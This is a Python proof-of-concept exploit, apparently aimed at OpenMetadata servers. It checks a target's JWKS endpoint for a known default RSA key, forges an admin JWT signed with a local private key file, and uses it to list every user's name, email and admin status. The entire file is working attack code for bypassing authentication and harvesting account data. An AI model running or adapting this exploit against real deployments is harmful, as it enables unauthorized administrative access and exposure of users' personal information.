import json, requests
import sys, jwt

def is_vulnerable(url):
    config_path = f"{url}/api/v1/config/jwks"
    rsa_n = "ANl0x260vLmL_kx8Hhg4KkXIgk2SSFNDbmj1EE-N1e6EII9xBabVskXdEOsWY7H-jvM9s1mXdKjUGzJu6iHJ0pAXrZCSrKKoNao0_hhCj9PRqEUCw6ZJewAoDK-jMYHu7hphNeUxUzgVBiW6CN28sfi0s4Oq2V6-Y3av_CKj-_zmokQLCw43nwvOQ2_jeyBPhbMXg1l_I5codW3z_nCDq4fazWcbFybnOpZaGRNM_QiAdJJ4dZi7BcUH1PygYA3S_6SwcKvSpeZ0ur3k4he4KZS7K-tSjlUc8qMlG1e_kz2_pV-HBhI8WjG9DLgqoqGcAf6sWVOnNmYrAYDLtqWsz2U="
    rsa_e = "AQAB"
    rsa_alg = "RS256"
    try:
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
        jwks_json = requests.get(config_path, headers = headers).json()
        for key in jwks_json['keys']:
            if key.get('n',None) == rsa_n and key.get('e',None) == rsa_e:
                return key.get('kid'), True
        return None, False
    except:
        return 'Error', False

def generate_jwt(kid):
    payload = {"sub":"admin","isBot":False,"iss":"open-metadata.org","exp":2936362591,"iat":1674058620,"email":"admin@openmetadata.org"}
    headers = {"kid":kid}
    pemfile = open("priv_key.pem", 'r')
    keystring = pemfile.read()
    pemfile.close()
    token = jwt.encode(payload, keystring, algorithm='RS256', headers = headers)
    return token

def send_request(url, token):
    user_api = f"{url}/api/v1/users"
    headers = {'Authorization':f"Bearer {token}",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
    try:
        get_users = requests.get(user_api, headers = headers).json()
        if get_users.get('data',None): #successful
            users = list()
            users_total = len(get_users['data'])
            for user in get_users['data']:
                users_local_dict = {'name':user.get('name',None),
                'display_name':user.get('displayName',None),
                'email':user.get('email',None),
                'admin':user['isAdmin']}
                users.append(users_local_dict)
            return users, True
        elif get_users.get('code',None):
            return get_users['code'], False
    except:
        return None, False

if __name__ == "__main__":
    request_url = sys.argv[1]
    print(f"Checking if {request_url} is vulnerable.")
    kid, is_vulnerable_bool = is_vulnerable(request_url)
    if is_vulnerable_bool:
        print(f">> Target is vulnerable. Generating JWT token")
        jwt_token = generate_jwt(kid)
        print(f">> JWT Token: {jwt_token} generated. Getting users.")
        users, exploit_worked_bool = send_request(url = request_url,
                                                    token = jwt_token)
        if exploit_worked_bool:
            print(f">> Exploit successful. Got following users:")
            for user in users:
                print(f"Name: {user['display_name']}; Email: {user['email']}; IsAdmin: {user['admin']}")
        else:
            print(f">> Something went wrong with JWT.")
    else:
        print(f">> Not vulnerable. Exiting.")
        exit(0)